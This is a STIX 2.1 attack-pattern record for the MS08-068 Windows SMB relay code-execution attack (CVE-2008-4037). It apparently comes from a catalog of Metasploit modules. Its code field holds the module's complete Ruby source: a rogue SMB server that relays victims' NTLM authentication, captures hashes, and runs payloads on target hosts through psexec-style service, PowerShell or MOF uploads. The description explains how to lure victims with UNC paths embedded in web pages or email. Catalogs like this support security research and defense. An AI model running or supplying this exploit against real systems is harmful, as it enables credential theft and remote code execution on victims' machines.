{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7be66d45-43fa-4114-acef-d3ae5bd66d3c",
    "created": "2024-08-14T16:56:30.956529Z",
    "modified": "2024-08-14T16:56:30.956533Z",
    "name": "MS08-068 Microsoft Windows SMB Relay Code Execution",
    "description": " This module will relay SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. To exploit this, the target system\tmust try to\tauthenticate to this module. The easiest way to force a SMB authentication attempt is by embedding a UNC path (\\SERVER\\SHARE) into a web page or email message. When the victim views the web page or email, their system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate.  Unfortunately, this module is not able to clean up after itself. The service and payload file listed in the output will need to be manually removed after access has been gained. The service created by this tool uses a randomly chosen name and description, so the services list can become cluttered after repeated exploitation.  The SMB authentication relay attack was first reported by Sir Dystic on March 31st, 2001 at @lanta.con in Atlanta, Georgia.  On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin includes a patch which prevents the relaying of challenge keys back to the host which issued them, preventing this exploit from working in the default configuration. It is still possible to set the SMBHOST parameter to a third-party host that the victim is authorized to access but the \"reflection\" attack has been effectively broken.  As of Feb 2022 - this module does not support SMB 1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/smb_relay.rb",
            "external_id": "smb_relay.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4037"
        },
        {
            "source_name": "reference",
            "url": "http://blogs.technet.com/swi/archive/2008/11/11/smb-credential-reflection.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://en.wikipedia.org/wiki/SMBRelay"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n=begin\nWindows XP systems that are not part of a domain default to treating all\nnetwork logons as if they were Guest. This prevents SMB relay attacks from\ngaining administrative access to these systems. This setting can be found\nunder:\n\n  Local Security Settings >\n   Local Policies >\n    Security Options >\n     Network Access: Sharing and security model for local accounts\n=end\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include ::Msf::Exploit::Remote::SocketServer\n\n  include ::Msf::Exploit::Remote::SMB::Server::HashCapture\n  include ::Msf::Exploit::Remote::SMB::Client::Psexec\n  include ::Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS08-068 Microsoft Windows SMB Relay Code Execution',\n        'Description' => %q{\n          This module will relay SMB authentication requests to another\n          host, gaining access to an authenticated SMB session if successful.\n          If the connecting user is an administrator and network logins are\n          allowed to the target machine, this module will execute an arbitrary\n          payload. To exploit this, the target system\tmust try to\tauthenticate\n          to this module. The easiest way to force a SMB authentication attempt\n          is by embedding a UNC path (\\SERVER\\SHARE) into a web page or\n          email message. When the victim views the web page or email, their\n          system will automatically connect to the server specified in the UNC\n          share (the IP address of the system running this module) and attempt\n          to authenticate.  Unfortunately, this\n          module is not able to clean up after itself. The service and payload\n          file listed in the output will need to be manually removed after access\n          has been gained. The service created by this tool uses a randomly chosen\n          name and description, so the services list can become cluttered after\n          repeated exploitation.\n\n          The SMB authentication relay attack was first reported by Sir Dystic on\n          March 31st, 2001 at @lanta.con in Atlanta, Georgia.\n\n          On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin\n          includes a patch which prevents the relaying of challenge keys back to\n          the host which issued them, preventing this exploit from working in\n          the default configuration. It is still possible to set the SMBHOST\n          parameter to a third-party host that the victim is authorized to access,\n          but the \"reflection\" attack has been effectively broken.\n\n          As of Feb 2022 - this module does not support SMB 1.\n        },\n        'Author' => [\n          'hdm', # Original SMB v1 relay module\n          'juan vazquez', # Original SMB v1 relay module - Add NTLMSSP support\n          'agalway-r7', # Add SMB 2/3 support\n          'alanfoster', # Add SMB 2/3 support\n          'Spencer McIntyre' # Add SMB 2/3 support\n        ],\n        'License' => MSF_LICENSE,\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Payload' => {\n          'Space' => 2048,\n          'DisableNops' => true,\n          'StackAdjustment' => -3500\n        },\n        'References' => [\n          ['CVE', '2008-4037'],\n          ['OSVDB', '49736'],\n          ['MSB', 'MS08-068'],\n          ['URL', 'http://blogs.technet.com/swi/archive/2008/11/11/smb-credential-reflection.aspx'],\n          ['URL', 'https://en.wikipedia.org/wiki/SMBRelay'],\n          ['URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx']\n        ],\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Automatic', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'PowerShell', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'Native upload', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'MOF upload', { 'Arch' => [ARCH_X86, ARCH_X64] } ],\n          [ 'Command', { 'Arch' => [ARCH_CMD] } ]\n        ],\n        'Notes' => {\n          'Stability' => [\n            CRASH_SAFE,\n          ],\n          'Reliability' => [\n            REPEATABLE_SESSION\n          ],\n          'SideEffects' => [\n            ARTIFACTS_ON_DISK,\n            IOC_IN_LOGS,\n            ACCOUNT_LOCKOUTS\n          ]\n        },\n        'DisclosureDate' => '2001-03-31',\n        'DefaultTarget' => 0,\n        'Actions' => [['Capture', { 'Description' => 'Run SMB MITM server' }]],\n        'PassiveActions' => ['Capture'],\n        'DefaultAction' => 'Capture'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('SMBSHARE', [false, 'The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share', ''], aliases: ['SHARE']),\n        OptAddressRange.new('RELAY_TARGETS', [true, 'Target address range or CIDR identifier to relay to'], aliases: ['SMBHOST']),\n        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),\n        OptPort.new('SRVPORT', [true, 'The local port to listen on.', 445]),\n        OptString.new('CAINPWFILE', [false, 'Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.', nil]),\n        OptString.new('JOHNPWFILE', [false, 'Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. Can also be a path.', nil]),\n        OptString.new('SMBDomain', [true, 'The domain name used during SMB exchange.', 'WORKGROUP'], aliases: ['DOMAIN_NAME']),\n        OptInt.new('SRV_TIMEOUT', [true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 25]),\n        OptInt.new('RELAY_TIMEOUT', [true, 'Seconds that the relay socket will wait for a response after the client has initiated communication.', 25])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),\n        OptString.new('SERVICE_FILENAME', [false, 'Filename to to be used on target for the service binary', nil]),\n        OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe']),\n        OptString.new('SERVICE_STUB_ENCODER', [false, 'Encoder to use around the service registering stub', nil])\n      ]\n    )\n\n    deregister_options('RPORT', 'RHOSTS', 'SMBPass', 'SMBUser')\n  end\n\n  def smb_logger\n    log_device = datastore['VERBOSE'] ? Msf::Exploit::Remote::SMB::LogAdapter::LogDevice::Module.new(self) : Msf::Exploit::Remote::SMB::LogAdapter::LogDevice::Framework.new(framework)\n    Msf::Exploit::Remote::SMB::LogAdapter::Logger.new(self, log_device)\n  end\n\n  class SMBRelayServer\n    include ::Rex::Proto\n\n    def initialize(options)\n      @options = options\n    end\n\n    def alias\n      super || 'SMB Relay Server'\n    end\n\n    #\n    # Returns the hardcore alias for the SMB service\n    #\n    def self.hardcore_alias(*args)\n      sock_options = sock_options_for(*args)\n      \"#{sock_options['LocalHost']}#{sock_options['LocalPort']}\"\n    end\n\n    def start\n      @listener_sock = Rex::Socket::TcpServer.create(sock_options)\n      @listener_server = Msf::Exploit::Remote::SMB::Relay::NTLM::Server.new(**smb_server_options(@listener_sock))\n      @listener_thread = Rex::ThreadFactory.spawn('SMBRelayServerListener', false) do\n        @listener_server.run\n      rescue StandardError => e\n        elog(e)\n      end\n    end\n\n    def stop\n      begin\n        @listener_server.close if @server && !@server.closed?\n        @listener_thread.kill if @listener_thread\n      rescue StandardError => e\n        print_error('Failed closing SMB server')\n        elog('Failed closing SMB server', error: e)\n      end\n\n      begin\n        @listener_sock.close if @listener_sock && !@listener_sock.closed?\n      rescue StandardError => e\n        print_error('Failed closing SMB server socket')\n        elog('Failed closing SMB server socket', error: e)\n      end\n    end\n\n    #\n    # This method waits on the server listener thread\n    #\n    def wait\n      @listener_thread.join if listener_thread\n    end\n\n    attr_accessor :listener_sock, :listener_thread\n\n    def self.sock_options_for(options)\n      {\n        'LocalHost' => '0.0.0.0',\n        'LocalPort' => 445\n      }.merge(options[:socket])\n    end\n\n    private\n\n    def sock_options\n      self.class.sock_options_for(@options)\n    end\n\n    def smb_server_options(listener_sock)\n      { server_sock: listener_sock }.merge(@options[:smb_server])\n    end\n  end\n\n  def start_service(_opts = {})\n    ntlm_provider = Msf::Exploit::Remote::SMB::Relay::Provider::AlwaysGrantAccess.new(\n      default_domain: datastore['SMBDomain']\n    )\n\n    # Set domain name for all future server responses\n    ntlm_provider.dns_domain = datastore['SMBDomain']\n    ntlm_provider.dns_hostname = datastore['SMBDomain']\n    ntlm_provider.netbios_domain = datastore['SMBDomain']\n    ntlm_provider.netbios_hostname = datastore['SMBDomain']\n\n    validate_smb_hash_capture_datastore(datastore, ntlm_provider)\n\n    comm = _determine_server_comm(datastore['SRVHOST'])\n    print_status(\"SMB Server is running. Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}\")\n    @service = Rex::ServiceManager.start(\n      self.class::SMBRelayServer,\n      {\n        socket: {\n          'Comm' => comm,\n          'LocalHost' => datastore['SRVHOST'],\n          'LocalPort' => datastore['SRVPORT'],\n          'Server' => true,\n          'Timeout' => datastore['SRV_TIMEOUT'],\n          'Context' => {\n            'Msf' => framework,\n            'MsfExploit' => self\n          }\n        },\n        smb_server: {\n          gss_provider: ntlm_provider,\n          logger: smb_logger,\n          relay_targets: Msf::Exploit::Remote::SMB::Relay::TargetList.new(datastore['RELAY_TARGETS'], randomize_targets: datastore['RANDOMIZE_TARGETS']),\n          listener: self,\n          relay_timeout: datastore['RELAY_TIMEOUT'],\n          thread_manager: framework.threads\n        }\n      }\n    )\n  end\n\n  def validate_service_stub_encoder!\n    service_encoder = datastore['SERVICE_STUB_ENCODER']\n    return if service_encoder.nil? || service_encoder.empty?\n\n    encoder = framework.encoders[service_encoder]\n    if encoder.nil?\n      raise Msf::OptionValidateError.new(\n        {\n          'SERVICE_STUB_ENCODER' => \"Failed to find encoder #{service_encoder.inspect}\"\n        }\n      )\n    end\n  end\n\n  def exploit\n    if datastore['RHOSTS'].present?\n      print_warning('Warning: RHOSTS datastore value has been set which is not supported by this module. Please verify RELAY_TARGETS is set correctly.')\n    end\n    validate_service_stub_encoder!\n\n    super\n  end\n\n  def on_relay_success(relay_connection:)\n    # The psexec mixins assume a single smb client instance is available, which makes it impossible\n    # to use when there are multiple SMB requests occurring in parallel. Let's create a replicant module,\n    # and set the datastore options and simple smb instance\n    new_mod_instance = replicant\n    new_mod_instance.datastore['RHOST'] = relay_connection.target.ip\n    new_mod_instance.datastore['RPORT'] = relay_connection.target.port\n    # The new module no longer needs a reference to the original smb server, deref it explicitly:\n    new_mod_instance.service.deref\n    new_mod_instance.service = nil\n    # Wrap the ruby_smb connection in a rex-compatible adapter\n    new_mod_instance.simple = ::Rex::Proto::SMB::SimpleClient.new(relay_connection.dispatcher.tcp_socket, client: relay_connection)\n\n    thread_name = \"Module(#{refname})(target=#{relay_connection.target.ip}:#{relay_connection.target.port})\"\n    framework.threads.spawn(thread_name, false, new_mod_instance) do |mod_instance|\n      mod_instance.exploit_smb_target\n    rescue StandardError => e\n      print_error(\"Failed running psexec against target #{datastore['RHOST']} - #{e.class} #{e.message}\")\n      elog(e)\n      # ensure\n      #   # Note: Don't cleanup explicitly, as the shared replicant state leads to payload handlers etc getting closed.\n      #   # The parent module will clean these shared resources\n      #   mod_instance.cleanup\n    end\n  end\n\n  def on_relay_failure(relay_connection:)\n    # noop\n  end\n\n  # Called after a successful connection to a relayed host is opened\n  def exploit_smb_target\n    # automatically select an SMB share unless one is explicitly specified\n    if datastore['SMBSHARE'] && !datastore['SMBSHARE'].blank?\n      smbshare = datastore['SMBSHARE']\n    elsif target.name == 'Command'\n      smbshare = 'C$'\n    else\n      smbshare = 'ADMIN$'\n    end\n\n    service_filename = datastore['SERVICE_FILENAME'] || \"#{rand_text_alpha(8)}.exe\"\n    service_encoder = datastore['SERVICE_STUB_ENCODER'] || ''\n\n    vprint_status 'Running psexec'\n    case target.name\n    when 'Automatic'\n      if powershell_installed?(smbshare, datastore['PSH_PATH'])\n        print_status('Selecting PowerShell target')\n        execute_powershell_payload\n      else\n        print_status('Selecting native target')\n        native_upload(smbshare, service_filename, service_encoder)\n      end\n    when 'PowerShell'\n      execute_powershell_payload\n    when 'Native upload'\n      native_upload(smbshare, service_filename, service_encoder)\n    when 'MOF upload'\n      mof_upload(smbshare)\n    when 'Command'\n      execute_command_payload(smbshare)\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-03-31",
    "x_mitre_platforms": [
        "win'"
    ]
}